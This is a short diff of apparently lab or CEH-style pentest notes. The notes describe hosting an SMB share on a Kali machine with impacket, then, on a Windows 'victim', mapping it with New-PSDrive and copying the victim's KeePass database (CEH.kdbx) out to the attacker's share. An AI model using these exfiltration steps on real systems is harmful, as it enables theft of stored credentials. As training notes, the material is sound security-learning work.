@@ -137,10 +137,13 @@ cd /opt/impacket/examples
 
 here we start up a share called 'Heyo'
 
-you need to use tickmarks with the pwd
+you need to use tickmarks with the pwd. note that the names "Heyo" and "Neigh" are completely arbitrary.
 
 on windows (our target/victim):
 
 `New-PSDrive -Name "Neigh" -PSProvider "FileSystem" -Root "\\my.kali.ip\Heyo" `
+
 `cd Neigh`
+
 `PS Neigh:\> cp C:\Users\victim\Documents\CEH.kdbx .`
+
